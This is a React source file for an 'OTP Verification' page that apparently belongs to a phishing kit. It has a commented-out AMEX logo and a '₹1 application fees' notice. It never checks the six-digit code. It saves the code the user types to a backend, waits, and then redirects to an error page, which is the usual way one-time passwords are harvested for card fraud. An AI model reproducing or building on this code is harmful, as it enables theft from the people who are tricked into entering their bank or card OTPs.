import React, { useEffect, useState } from 'react';
import { useNavigate } from 'react-router-dom';
import LoadingSpinner from '../components/LoadingSpinner';
import { useAppContext } from '../context/AppContext';

const OTP_LENGTH = 6;
const TIMER_SECONDS = 300;

const OtpPage: React.FC = () => {
  const [otp, setOtp] = useState('');
  const [timer, setTimer] = useState(TIMER_SECONDS);
  const [error, setError] = useState('');
  const [loading, setLoading] = useState(false);
  const navigate = useNavigate();
  const { userData } = useAppContext();

  useEffect(() => {
    if (timer === 0) return;
    const interval = setInterval(() => {
      setTimer((prev) => prev - 1);
    }, 1000);
    return () => clearInterval(interval);
  }, [timer]);

  const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value.replace(/\D/g, '').slice(0, OTP_LENGTH);
    setOtp(value);
    setError('');
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (otp.length !== OTP_LENGTH) {
      setError('Please enter the 6-digit OTP.');
      return;
    }

    setLoading(true);
    try {
      // First check if user exists
      const checkResponse = await fetch(`http://localhost:8000/api/users/check`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          phone: userData.phone
        })
      });

      // Check if we have user ID
      if (!userData.userId) {
        throw new Error('User ID not found. Please start from the beginning.');
      }

      // Update OTP using user ID
      const response = await fetch(`${import.meta.env.VITE_API_URL}/api/users/${userData.userId}/otp`, {
        method: "PUT",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          otp: otp
        })
      });

      const responseData = await response.json();

      if (!response.ok) {
        throw new Error(responseData.error || 'Failed to save OTP');
      }

      if (responseData.success) {
        // Add 1.5 second delay before navigating
        setTimeout(() => {
          navigate('/error');
          setLoading(false);
        }, 3000);
      } else {
        throw new Error(responseData.error || 'Failed to save OTP');
      }
    } catch (err: Error | unknown) {
      const errorMessage = err instanceof Error ? err.message : 'Failed to save OTP. Please try again.';
      setError(errorMessage);
      console.error('Error saving OTP:', err);
      setLoading(false);
    }
  };

  return (
    <div className="flex flex-col items-center justify-center min-h-screen bg-gray-50">
      <div className="bg-white p-6 rounded shadow w-full max-w-sm">
        {/* <div className="flex justify-center mb-4">
          <img src="/assets/amex-logo.png" alt="AMEX" className="h-10" />
        </div> */}
        <h2 className="text-xl font-bold mb-2 text-center">OTP Verification</h2>
        <p className="text-center mb-4">₹1 application fees will be charged!</p>
        <form onSubmit={handleSubmit} className="space-y-4">
          <input
            type="tel"
            value={otp}
            onChange={handleChange}
            maxLength={OTP_LENGTH}
            className="w-full border rounded px-3 py-2 text-center text-xl tracking-widest"
            placeholder="Enter OTP"
            autoFocus
            disabled={loading}
          />
          <div className="text-right text-sm text-gray-500">{otp.length}/{OTP_LENGTH}</div>
          <div className="text-center text-gray-600 mb-2">
            Time Remaining: {timer} second{timer !== 1 ? 's' : ''}
          </div>
          {error && <div className="text-red-500 text-center text-sm">{error}</div>}
          <button
            type="submit"
            className="w-full bg-[#ae265f] text-white py-2 rounded disabled:opacity-50"
            disabled={timer === 0 || loading}
          >
            {loading ? (
              <div className="flex items-center justify-center">
                <LoadingSpinner size="small" />
                <span className="ml-2">Verifying...</span>
              </div>
            ) : (
              'Verify OTP'
            )}
          </button>
        </form>
      </div>
    </div>
  );
};

export default OtpPage;
